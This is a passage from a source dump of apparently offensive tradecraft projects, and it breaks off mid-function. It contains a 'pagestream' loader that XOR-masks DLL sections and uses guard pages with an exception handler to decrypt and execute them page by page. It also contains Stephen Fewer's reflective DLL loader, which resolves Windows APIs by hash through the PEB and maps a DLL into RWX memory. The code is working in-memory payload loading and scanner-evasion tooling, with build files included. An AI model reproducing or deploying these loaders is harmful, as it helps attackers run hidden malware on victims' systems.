		if (regions[x].start == 0 && regions[x].end == 0) {
			dprintf("Setting up shop in %d for %p (%d) perms %d (SRC: %p)", x, payload, len, permissions, src);

			regions[x].start       = (ULONG_PTR)payload;
			regions[x].end         = (ULONG_PTR)payload + len;
			regions[x].source      = src;
			regions[x].permissions = permissions;
			return;
		}
	}

	dprintf("No empty guard regions!");
}

/* grab our guard region */
GUARDREGION * GetGuardRegion(ULONG_PTR address) {
	for (int x = 0; x < MAXREGIONS; x++) {
		if (address >= regions[x].start && address < regions[x].end)
			return & regions[x];
	}

	return NULL;
}

/*
 * a global variable with our xorkey, we're going to set this to a random value via
 * our loader.spec to demonstrate the 'patch' command applied to COFFs. Note, we set
 * this to a value, because 'patch' can't update an unintialized value.
 */
char xorkey[16] = { 1 };

/*
 * A simple routine to obfuscate and de-obfuscate memory with our payload stream data.
 */
void applyxor(char * data, DWORD len) {
	for (DWORD x = 0; x < len; x++) {
		data[x] ^= xorkey[x % 16];
	}
}

/*
 * Our VEH to response to page accesses and stream in content.
 */
LONG WINAPI GuardExecVEHHandler(EXCEPTION_POINTERS * pExceptionPointers) {
	PEXCEPTION_RECORD ExceptionRecord = pExceptionPointers->ExceptionRecord;
	ULONG_PTR ExceptionAddress;
	ULONG_PTR PageAddress;
	DWORD oldprot;
	GUARDREGION * guard = NULL;

	/*
 	 * I break for guard pages.
	 */
	if (ExceptionRecord->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)
		return EXCEPTION_CONTINUE_SEARCH;

	if (ExceptionRecord->NumberParameters < 2)
		return EXCEPTION_CONTINUE_SEARCH;

	/* pull the needed info our of the arguments */
	//AccessType       = ExceptionRecord->ExceptionInformation[0];
	ExceptionAddress = ExceptionRecord->ExceptionInformation[1];
	PageAddress      = ExceptionAddress - (ExceptionAddress % 0x1000);

	/* check if the exception occurred somewhere within our regions we're tracking */
	guard = GetGuardRegion(ExceptionAddress);
	if (guard == NULL) {
		dprintf("The exception occurred elsewhere: %p", ExceptionAddress);
		return EXCEPTION_CONTINUE_SEARCH;
	}

	//dprintf("[%p] We have a guard page violation exception!! %p FROM %p", KERNEL32$GetCurrentThreadId(), ExceptionAddress, ExceptionRecord->ExceptionAddress);

	if (guard->permissions == PAGE_EXECUTE_READ) {
		dprintf("LOAD  EXEC %p", PageAddress);
	}
	else {
		dprintf("LOAD  DATA %p", PageAddress);
	}

	/* make our target page writeable... */
	ULONG_PTR srcaddr = (ULONG_PTR)guard->source + (PageAddress - guard->start);
	KERNEL32$VirtualProtect((void *)PageAddress, 0x1000, PAGE_READWRITE, &oldprot);

	/* stream in ONE page of content from our payload */
	memcpy(PageAddress, srcaddr, 0x1000);

	/* unmask the page's contents */
	applyxor((char *)PageAddress, 0x1000);

	/* change the protection of our streamed in page to the permissions we want */
	KERNEL32$VirtualProtect((void *)PageAddress, 0x1000, guard->permissions, &oldprot);

	/* this seems like a REALLY good idea here */
	KERNEL32$FlushInstructionCache((HANDLE)-1, (void *)PageAddress, 0x1000);

	/* do the book keeping for this page */
	TrackPage(PageAddress);

	/* yeap, the exception is expected and handled... return to our code that was executing as if nothing happened */
	return EXCEPTION_CONTINUE_EXECUTION;
}

#define FLAG(x, y) ( ((x) & (y)) == (y) )

void GuardSections(DLLDATA * dll, char * dst, char * src) {
	DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
	DWORD                   perms            = 0;
	DWORD                   oldprot;

	/* our first section! */
	sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

	for (int x = 0; x < numberOfSections; x++) {
		perms = 0;

		/*
		 * It's a bad idea to take our writeable memory and subject it to streaming. This will lead to some serious
		 * confusion as variable updates, suddenly, become corrupted or aren't taking. Why? Because our stream src
		 * is treated as a read-only/constant thing. This implementation doesn't patch updated content in a page
		 * back into the stream src for retrieval later. It could, but I didn't feel like going there for now.
		 */
		if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE)) {
			memcpy(dst + sectionHdr->VirtualAddress, src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);
			sectionHdr++;
			continue;
		}

		if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE))
			perms = PAGE_EXECUTE_READ;
		else
			perms = PAGE_READWRITE;

		/* since we're guarding this region, let's "obfuscate" the contents in our stream src */
		applyxor(src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);

		/* register this region of memory (and its permissions) in our guard table */
		AddGuardRegion(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, src + sectionHdr->VirtualAddress, perms);

		/* And, the real magic, setting up guard pages */
		KERNEL32$VirtualProtect(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, PAGE_READWRITE | PAGE_GUARD, &oldprot);

		/* advance to our next section */
		sectionHdr++;
	}
}

void GuardExecInit() {
	/* initialize our regions to 0 */
	for (int x = 0; x < MAXREGIONS; x++) {
		regions[x].start = 0;
		regions[x].end   = 0;
	}

	/* initialize our state queue to 0 too */
	state.index = 0;
	for (int x = 0; x < MAXVISIBLE; x++)
		state.pages[x] = NULL;
}

```

## File: pagestream/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char RESOURCE_DLL[0] __attribute__((section("my_data")));
char RESOURCE_GEX[0] __attribute__((section("my_guardexec")));

/*
 * Our PICO loader, have fun, go nuts!
 */
char * SetupCOFF(IMPORTFUNCS * funcs, char * srcData) {
	char * dstCode = NULL;
	char * dstData = NULL;

	/* allocate memory */
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(srcData), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(srcData), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );

	/* load our pico into our destination address, thanks! */
	PicoLoad(funcs, srcData, dstCode, dstData);

	return dstCode;
}

// setup() function for guard exec
typedef void (*GUARDEXEC_SETUP_3)(char * loaderWillFree, DLLDATA * data, char * dstdll);

// our 0 argument go() function
typedef void (*GUARDEXEC_GO_0)();

/* this is the linker tag intrinsic to get our setup function out of the PICO */
DWORD __tag_setup();

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	/* find our DLL appended to this PIC */
	char * srcdll = RESOURCE_DLL;

	/* resolve the functions we'll need */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* parse our DLL! */
	ParseDLL(srcdll, &data);

	/* allocate memory for our DLL and the other stuff within our layout.  */
	char * dstdll = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned DLL */
	LoadDLL(&data, srcdll, dstdll);

	/* process the imports */
	ProcessImports(&funcs, &data, dstdll);

	/* setup and run our GuardExec nmodule */
	char * srcge = RESOURCE_GEX;
	char * dstge = SetupCOFF(&funcs, srcge);

	/* call our (exported) setup function for our guardexec stuff */
	GUARDEXEC_SETUP_3 ge_setup = (GUARDEXEC_SETUP_3)PicoGetExport(srcge, dstge, __tag_setup());
	ge_setup((char *)go, &data, dstdll);

	/* get the entry point for our guard exec module */
	GUARDEXEC_GO_0 ge_go = PicoEntryPoint(srcge, dstge);

	/* we use __transfer on x64 to do a tailcall... or just call it on x86 */
#ifdef WIN_X64
	__transfer(ge_go);
#else
	ge_go();
#endif
}

```

## File: pagestream/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: rdllinjection/LICENSE.txt

```text
Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: rdllinjection/loader.spec

```text
name      "Generic_ReflectiveDLLInjection"
author    "Stephen Fewer (original), AFF-WG (TCG integration)"
describe  "Loading libraries from memory into host processes since 2008"
reference "https://github.com/stephenfewer/ReflectiveDLLInjection, https://tradecraftgarden.org/rdlli.html"
license   "BSD"

x86:
	load "bin/loader.x86.o"
		make pic

		fixptrs "_caller"

		push $DLL
			link "my_dll"

		export

x64:
	load "bin/loader.x64.o"
		make pic

		push $DLL
			link "my_dll"

		export

```

## File: rdllinjection/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith -Wno-unknown-pragmas

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/ReflectiveLoader.c -o bin/loader.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/ReflectiveLoader.c -o bin/loader.x64.o

clean:
	rm -rf bin


```

## File: rdllinjection/src/ReflectiveDLLInjection.h

```h
//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#ifndef _REFLECTIVEDLLINJECTION_REFLECTIVEDLLINJECTION_H
#define _REFLECTIVEDLLINJECTION_REFLECTIVEDLLINJECTION_H
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

// we declare some common stuff in here...

#define DLL_QUERY_HMODULE		6

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
typedef BOOL (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );

#define DLLEXPORT   __declspec( dllexport ) 

//===============================================================================================//
#endif
//===============================================================================================//

```

## File: rdllinjection/src/ReflectiveLoader.c

```c
//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"

char * findAppendedDLL();

//===============================================================================================//

// Note 1: If you want to have your own DllMain, define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN,  
//         otherwise the DllMain at the end of this file will be used.

// Note 2: If you are injecting the DLL via LoadRemoteLibraryR, define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR,
//         otherwise it is assumed you are calling the ReflectiveLoader via a stub.

// This is our position independent reflective DLL loader/injector
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
#else
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
	// the functions we need
	LOADLIBRARYA pLoadLibraryA     = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc     = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

	USHORT usCounter;

	// the initial location of this image in memory
	ULONG_PTR uiLibraryAddress;
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR uiBaseAddress;

	// variables for processing the kernels export table
	ULONG_PTR uiAddressArray;
	ULONG_PTR uiNameArray;
	ULONG_PTR uiExportDir;
	ULONG_PTR uiNameOrdinals;
	DWORD dwHashValue;

	// variables for loading this image
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;

	// STEP 0: calculate our images current base address

	uiLibraryAddress = (ULONG_PTR)findAppendedDLL();

	// STEP 1: process the kernels exports for the functions our loader needs...

	// get the Process Enviroment Block
#ifdef WIN_X64
	uiBaseAddress = __readgsqword( 0x60 );
#elif defined(WIN_X86)
	uiBaseAddress = __readfsdword( 0x30 );
#endif

	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
	uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

	// get the first entry of the InMemoryOrder module list
	uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
	while( uiValueA )
	{
		// get pointer to current modules name (unicode string)
		uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
		// set bCounter to the length for the loop
		usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
		// clear uiValueC which will store the hash of the module name
		uiValueC = 0;

		// compute the hash of the module name...
		do
		{
			uiValueC = ror( (DWORD)uiValueC );
			// normalize to uppercase if the madule name is in lowercase
			if( *((BYTE *)uiValueB) >= 'a' )
				uiValueC += *((BYTE *)uiValueB) - 0x20;
			else
				uiValueC += *((BYTE *)uiValueB);
			uiValueB++;
		} while( --usCounter );

		// compare the hash with that of kernel32.dll
		if( (DWORD)uiValueC == KERNEL32DLL_HASH )
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

			// get the VA for the array of name pointers
			uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
			
			// get the VA for the array of name ordinals
			uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

			usCounter = 3;

			// loop while we still have imports to find
			while( usCounter > 0 )
			{
				// compute the hash values for this function name
				dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
				
				// if we have found a function we want we get its virtual address
				if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH )
				{
					// get the VA for the array of addresses
					uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

					// store this functions VA
					if( dwHashValue == LOADLIBRARYA_HASH )
						pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
					else if( dwHashValue == GETPROCADDRESS_HASH )
						pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
					else if( dwHashValue == VIRTUALALLOC_HASH )
						pVirtualAlloc = (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );
			
					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}
		else if( (DWORD)uiValueC == NTDLLDLL_HASH )
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

			// get the VA for the array of name pointers
			uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
			
			// get the VA for the array of name ordinals
			uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

			usCounter = 1;

			// loop while we still have imports to find
			while( usCounter > 0 )
			{
				// compute the hash values for this function name
				dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
				
				// if we have found a function we want we get its virtual address
				if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
				{
					// get the VA for the array of addresses
					uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

					// store this functions VA
					if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
						pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)( uiBaseAddress + DEREF_32( uiAddressArray ) );

					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}

		// we stop searching when we have found everything we need.
		if( pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache )
			break;

		// get the next entry
		uiValueA = DEREF( uiValueA );
	}

	// STEP 2: load our image into a new permanent location in memory...

	// get the VA of the NT Header for the PE to be loaded
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// we must now copy over the headers
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;

	while( uiValueA-- )
		*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

	// STEP 3: load in all of our sections...

	// uiValueA = the VA of the first section
	uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
	
	// itterate through all sections, loading them into memory.
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while( uiValueE-- )
	{
		// uiValueB is the VA for this section
		uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

		// uiValueC if the VA for this sections data
		uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

		// copy the section over
